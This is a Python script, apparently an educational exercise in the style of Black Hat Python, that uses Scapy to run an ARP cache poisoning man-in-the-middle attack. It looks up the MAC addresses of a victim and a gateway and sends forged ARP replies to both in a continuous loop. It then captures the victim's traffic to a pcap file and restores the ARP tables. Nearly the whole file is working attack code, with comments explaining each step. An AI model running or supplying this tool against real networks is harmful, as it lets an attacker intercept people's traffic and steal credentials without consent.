'''
This script is the basis for an ARP cache poisoning MitM attack
'''

'''
Forwarding traffic between gateway and victim host in Kali:
    - echo 1 > /proc/sys/net/ipv4/ip_forward
'''

from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import os
import time
import sys

'''
For ARP poisoning MitM:
        - need the MAC of the victim and the gateway
'''

def get_mac(targetip):      # get the MAC address of any victim machine; take in IP and return MAC
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)# broadcast frame requesting the IP that belongs to the broadcast MAC address
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)   # srp() sends and receives frames on layer 2
    for _, r in resp:
        return r[Ether].src     # return the layer 2 source address (MAC) of the target IP
    return None

class Arper:                # poison, sniff, and restore the network
    def __init__(self, victim, gateway, interface='wlp9s0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)


    def run(self):      # run() method is the entry point for the attack
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()      # this process poisons the ARP cache on the LAN

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()       # this process sniffs the traffic following the poisoning

    def poison(self):       # creating the poisoned packets and sending them out on the network, specifically the target and the gateway
        poison_victim = ARP()       # this is a poisoned ARP packet meant for the victim
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f"ip src: {poison_victim.psrc}")
        print(f"ip dst: {poison_victim.pdst}")
        print(f"mac dst: {poison_victim.hwdst}")
        print(f"mac src: {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()      # this is a poisoned ARP packet meant for the gateway
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src" {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f"Beginning the ARP poison. [CRTL-C to stop]")
        while True:                 # this loop ensures that the packets are sent continually to maintain the charade
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:       # the loop is broken with ctrl-c and the network is restored to normal
                self.restore()
                sys.exit()
            else:
                time.sleep(2)


    def sniff(self, count=200):         # see and record the attack as it happens
        time.sleep(5)                       # giving the poisoning thread time to start working
        print(f"Sniffing {count} packets")
        bpf_filter = f"ip host {victim}"                # filtering for packets that have the victim's ip
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)       # count of packets can be changed as needed
        wrpcap('arper.pcap', packets)               # write the captured packets to the specified file
        print('Got the packets')
        self.restore()                              # restore the ARP cache to its original state
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):              # can be invoked from poison() and sniff()
        print('Restoring ARP tables...')
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)     # sending real gateway information to the victim
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)      # sending the real victim information to the gateway

if __name__ == "__main__":
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()